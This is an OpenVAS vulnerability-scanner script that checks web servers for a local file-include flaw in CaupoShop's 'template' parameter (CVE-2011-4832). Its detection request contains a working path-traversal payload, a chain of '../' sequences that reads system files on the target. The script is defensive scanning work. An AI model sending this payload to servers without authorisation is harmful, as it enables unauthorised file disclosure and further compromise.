###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cauposhop_50530.nasl 12018 2018-10-22 13:31:29Z mmartin $
#
# CaupoShop 'template' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103335");
  script_bugtraq_id(50530);
  script_cve_id("CVE-2011-4832");
  script_version("$Revision: 12018 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("CaupoShop 'template' Parameter Local File Include Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50530");
  script_xref(name:"URL", value:"http://www.caupo.com");
  script_xref(name:"URL", value:"http://www.caupo.net/de/shopsysteme/csp/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-22 15:31:29 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-11-07 10:54:56 +0100 (Mon, 07 Nov 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"CaupoShop is prone to a local file-include vulnerability because it
fails to sufficiently sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the Web server process. This may allow the attacker
to compromise the application and computer. Other attacks are
also possible.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/shop", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( "cauposhop" >< tolower( buf ) ) {

    foreach file( keys( files ) ) {

      url = string(dir,"/index.php?action=template&template=",crap(data:"../",length:6*9),files[file]);

      if(http_vuln_check(port:port, url:url,pattern:file)) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
